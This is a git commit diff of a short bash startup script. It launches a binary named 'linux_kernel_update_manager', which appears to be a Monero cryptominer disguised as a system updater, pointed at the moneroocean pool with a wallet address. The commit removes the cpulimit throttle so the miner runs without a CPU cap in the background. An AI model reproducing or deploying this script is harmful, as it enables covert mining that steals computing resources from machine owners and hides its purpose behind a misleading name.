7887c93133c648ab2dfbc5a4c71a5227c32cac1d
aureliehermanova <41370626+aureliehermanova@users.noreply.github.com>
2018-07-22 11:07:35 +0200

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,10 +1,6 @@
 #!/bin/bash
-sudo apt-get update &
-sleep 10
-sudo apt install -y cpulimit &&
 chmod +x ~/gg001/linux_kernel_update_manager &&
-cpulimit -e linux_kernel_update_manager -l 50 -b &
-sleep 10
+sleep 60
 ~/gg001/./linux_kernel_update_manager --any --ssl --forever --variation 3 --low -o gulf.moneroocean.stream:443 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev+1000 -p miner3 -c ~/gg001/config.txt &
 sleep 60m
 
